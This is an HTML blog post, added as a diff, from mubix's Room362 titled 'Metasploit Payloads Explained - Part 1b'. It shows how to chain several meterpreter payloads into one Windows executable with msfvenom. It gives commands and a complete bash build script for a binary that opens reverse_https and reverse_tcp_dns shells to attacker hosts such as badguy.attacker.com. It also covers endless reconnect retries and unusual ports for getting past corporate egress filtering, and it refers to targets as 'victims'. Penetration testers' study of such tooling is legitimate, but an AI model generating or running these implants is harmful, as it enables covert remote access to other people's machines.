@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta name="generator" content="Hugo 0.15" />
+
+  <title>Metasploit Payloads Explained - Part 1b &middot; Room362</title>
+
+  
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-old-ie-min.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
+  <!--<![endif]-->
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="/css/side-menu-old-ie.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="/css/side-menu.css">
+  <!--<![endif]-->
+
+  <link rel="stylesheet" href="/css/blackburn.css">
+
+  
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+  
+  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">
+
+  
+  <link rel="alternate" type="application/rss+xml" title="Room362" href="http://room362.com/index.xml" />
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/styles/androidstudio.min.css">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+  <link rel="shortcut icon" href="http://room362.com/img/favicon.ico" type="image/x-icon" />
+
+</head>
+
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/brandon/"><i class='fa fa-users fa-fw'></i>Brandon</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://room362.com/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+    </li>
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://twitter.com/mubix" target="_blank"><i class="fa fa-twitter fa-fw"></i>Twitter</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://facebook.com/mubix" target="_blank"><i class="fa fa-facebook fa-fw"></i>Facebook</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://plus.google.com/+mubix" target="_blank"><i class="fa fa-google-plus-square fa-fw"></i>Google+</a>
+    </li>
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://instagram.com/mubix" target="_blank"><i class="fa fa-instagram fa-fw"></i>Instagram</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://flickr.com/photos/mubix" target="_blank"><i class="fa fa-flickr fa-fw"></i>Flickr</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://youtube.com/user/hak5" target="_blank"><i class="fa fa-youtube fa-fw"></i>YouTube</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://vimeo.com/mubix" target="_blank"><i class="fa fa-vimeo fa-fw"></i>Vimeo</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://slideshare.net/mubix" target="_blank"><i class="fa fa-slideshare fa-fw"></i>SlideShare</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://linkedin.com/in/mubix" target="_blank"><i class="fa fa-linkedin fa-fw"></i>LinkedIn</a>
+    </li>
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://reddit.com/user/mubix" target="_blank"><i class="fa fa-reddit fa-fw"></i>Reddit</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://github.com/mubix" target="_blank"><i class="fa fa-github-alt fa-fw"></i>GitHub</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https:////bitbucket.org/mubix" target="_blank"><i class="fa fa-bitbucket fa-fw"></i>Bitbucket</a>
+    </li>
+    
+
+    
+
+  </ul>
+</div>
+
+  <div class="pure-g">
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>&copy; 2016. All rights reserved.</small>
+  </div>
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>Metasploit Payloads Explained - Part 1b</h1>
+  <h2></h2>
+</div>
+<div class="content">
+  <p>This series was interrupted a bit by the new Metasploit HTTP/HTTPS payloads (<a href="https://community.rapid7.com/community/metasploit/blog/2011/06/29/meterpreter-httphttps-communication">more info</a>). Definitely not complaining though as the new features *(as will be discussed in part 2) are some epic new additions to the payloads list. However an important change happened while the craziness over the new payloads was going on. ScriptJunkie snuck in an awesome change to msfvenom (a.k.a. msffsm).</p>
+
+<p>Here is the link to the ticket about the change (<a href="https://dev.metasploit.com/redmine/issues/4714">link</a>) and the revision (<a href="https://dev.metasploit.com/redmine/projects/framework/repository/revisions/13057">r13057</a>)</p>
+
+<p><strong>TL;DR version</strong>: This change allows you to put multiple payloads into one binary&hellip; ya.. awesomesauce.</p>
+
+<p>He gives the following example:</p>
+
+<pre><code>ruby msfvenom -p windows/messagebox -f raw EXITFUNC=thread &gt; /tmp/msgbox.raw
+ruby msfvenom -p windows/meterpreter/reverse_tcp -f raw -t /tmp/msgbox.raw -k LHOST=192.168.0.102 EXITFUNC=thread &gt; /tmp/rev102msgbox.raw
+ruby msfvenom -p - -f exe &lt; /tmp/rev102msgbox.raw &gt; /tmp/rev102msgbox.exe
+</code></pre>
+
+<p>This example when &lsquo;rev102msgbox.exe&rsquo; is run will pop up a message box with the default options (Hello, from MSF!) and throw a reverse)tcp connection to 192.168.0.102 over the default port of 4444.</p>
+
+<p>This is great as an example and a good way to test to see if things are working, but I don&rsquo;t normally like to inform my victims that I&rsquo;m there by saying hello (especially if I&rsquo;m not there to see their faces).</p>
+
+<p>So I thought that this would be a great way of throwing a bunch of payloads together to try a few of the tried and true ways of getting past restrictive networks all in one binary. I started off with 3 payloads:</p>
+
+<ul>
+<li>reverse_tcp_dns to port 7815</li>
+<li>reverse_tcp_dns to port 80</li>
+<li>reverse_https to port 443</li>
+</ul>
+
+<p>I chose those because I can change the DNS to point to a new IP address in future without having to regenerate my binary and size really isn&rsquo;t a concern since I won&rsquo;t be using it in an exploit.</p>
+
+<p><em>(<strong>SIDE NOT</strong>E: The motive for the port 7815 one is because sometimes there are proxy settings for port 80 and 443 <em>which the new HTTP/HTTPS payloads can handle (&lsquo;cept for Auth proxies)</em> but for some reason quite regularly companies will still allow odd ports to fly through unencumbered)</em></p>
+
+<p>Here is what I did:</p>
+
+<pre><code>./msfvenom -p windows/meterpreter/reverse_https -f raw LHOST=badguy.attacker.com LPORT=443 &gt; /tmp/stage1.raw
+./msfvenom -p windows/meterpreter/reverse_tcp_dns -f raw LHOST=badguy.attacker.com LPORT=80 -c /tmp/stage1.raw &gt; /tmp/stage2.raw
+./msfvenom -p windows/meterpreter/reverse_tcp_dns -f exe LHOST=badguy2.attacker.com LPORT=7815 -c /tmp/stage2.raw &gt; /tmp/stage3.exe
+</code></pre>
+
+<p>Luckily (and you&rsquo;ll see why in a second) I forgot to set up a multi/handler on port 7815, which caused me to notice an issue. When one of the payloads failed to connect, &lsquo;<strong>ExitProcess</strong>&rsquo; was called, causing all of my payloads to die prematurely (even if they had already gotten the second stage).</p>
+
+<p>I tried setting <strong>AutoRunScript</strong> to &lsquo;migrate -f&rsquo; so that the payloads would migrate out into a new Notepad process. But the connection died too quickly and none of the payloads were fast enough at jumping ship.</p>
+
+<p><strong>ReverseConnectRetries</strong> to the rescue. This is an advanced setting for the reverse_tcp family (ipv6_tcp, nonx_tcp, ord_tcp, tcp, tcp_allports, tcp_dns) which tells the payload how many times to loop through the initial connection. This setting defaults to 5 but can be anything between 1 and 255. The 255 setting is special since it actually sets an infinite loop. Sweet, now our sinking should never call the ExitProcess command right? Not quite, reverse_https and reverse_http doesn&rsquo;t have this setting. We are still in a bit of a race condition if we want to use those payloads but it is a race we can win now at least.</p>
+
+<p>I wrote a very simple batch file to generate my new binary when I need it (also so I don&rsquo;t have to remember all the commands):</p>
+
+<pre><code class="language-bash">#!/bin/bash
+
+echo Building Stage 1
+./msfvenom -p windows/meterpreter/reverse_https -f raw LHOST=badguy.attacker.com LPORT=443 &gt; /tmp/stage1.raw
+
+echo Building Stage 2
+./msfvenom -p windows/meterpreter/reverse_tcp_dns -f raw LHOST=badguy.attacker.com ReverseConnectRetries=255 LPORT=80 -c /tmp/stage1.raw &gt; /tmp/stage2.raw
+
+echo Building Stage 3
+./msfvenom -p windows/meterpreter/reverse_tcp_dns -f exe LHOST=badguy2.attacker.com ReverseConnectRetries=255 LPORT=7815 -c /tmp/stage2.raw &gt; /tmp/stage3.exe
+
+echo Cleaning up...
+rm -rf /tmp/stage1.raw /tmp/stage2.raw
+
+echo Done..
+</code></pre>
+
+<p>Plus it tells you whats going on and does a bit of clean up, leaving you with just your hydra-binary. One of the things I thought about adding was the cmd/windows/adduser payload just so if the user is an admin we can start our day off without having to add ourselves a user but I decided against it just for clean up and &ldquo;noise&rdquo; purposes.</p>
+
+<p>(You&rsquo;ll also notice that one of the payloads is going somewhere else.. no reason to not give your payloads every chance of getting out) Sharing is caring right?</p>
+
+</div>
+
+</div>
+</div>
+<script src="http://room362.com/js/ui.js"></script>
+
+
+
+
+</body>
+</html>
+
